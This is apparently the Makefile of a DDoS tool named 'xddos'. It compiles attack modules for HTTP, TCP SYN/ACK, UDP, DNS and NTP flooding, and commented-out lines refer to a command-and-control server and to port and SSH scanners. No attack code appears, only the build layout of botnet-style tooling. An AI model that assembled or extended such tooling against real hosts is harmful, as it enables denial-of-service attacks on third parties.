
CPPFLAGS  =   -ggdb -DCORE_DUMP  -O3 -pthread -Wall
CPPFLAGS += -I ./xutil/include
CPPFLAGS += -I ./netpool/include
CPPFLAGS += -I ./netpool/outclass
CPPFLAGS += -I./
CPPFLAGS += -rdynamic -D_RPS_LINUX

LDFLAGS += -lpthread

SOURCES = $(wildcard *.cpp ./xutil/src/*.cpp  ./netpool/src/*.cpp ./netpool/outclass/*.cpp) 

#SOURCES += ./scan/CScanConfig.cpp
#CPPFLAGS += -I ./scan/

#SOURCES += ./scan/portscan/CPortScan.cpp
#SOURCES += ./scan/portscan/CPortScanCfg.cpp
#SOURCES += ./scan/portscan/CPortScanHost.cpp
#SOURCES += ./scan/portscan/CPortScanRecvSock.cpp
#SOURCES += ./scan/portscan/CPortScanSendSock.cpp
#CPPFLAGS += -I ./scan/portscan/

# SOURCES += ./scan/sshscan/CSshScan.cpp
# SOURCES += ./scan/sshscan/CSshScanCfg.cpp
# SOURCES += ./scan/sshscan/CSshScanObj.cpp
# CPPFLAGS += -I ./scan/sshscan/
# CPPFLAGS += -I ./scan/sshscan/lib/ssh/
# CPPFLAGS += -I ./scan/sshscan/lib/
# LDFLAGS += -L./scan/sshscan/lib/ssh/ -lssh

CPPFLAGS += -DINCLUDE_DDOS
SOURCES += ./ddos/CAttack.cpp
SOURCES += ./ddos/CDDoSApp.cpp
SOURCES += ./ddos/CDDoSParser.cpp
SOURCES += ./ddos/CDDoSParams.cpp
SOURCES += ./ddos/CAttackMgr.cpp
#SOURCES += ./ddos/CCncServer.cpp
SOURCES += ./ddos/attack/CHttpAtk.cpp
SOURCES += ./ddos/attack/CTcpSynAtk.cpp
SOURCES += ./ddos/attack/CTcpAckAtk.cpp
SOURCES += ./ddos/attack/CUdpAtk.cpp
SOURCES += ./ddos/attack/CDnsAtk.cpp
SOURCES += ./ddos/attack/CNtpAtk.cpp
CPPFLAGS += -I ./ddos
CPPFLAGS += -I ./ddos/attack

OBJECTS = $(patsubst %.cpp,%.o,$(SOURCES))
DEPENDS = $(patsubst %.cpp,%.d,$(SOURCES))
ASMFILE = $(patsubst %.cpp,%.s,$(SOURCES))

.PHONY: all clean

target = xddos
all: $(target)

$(target): $(OBJECTS)	
	g++ -o $(target)  $(OBJECTS)  $(LDFLAGS) -lnet
	#strip -s $(target)
	
clean:
	@rm -fr $(OBJECTS) $(DEPENDS) $(ASMFILE) $(target)
	@rm -fr *.d *.o *.s 

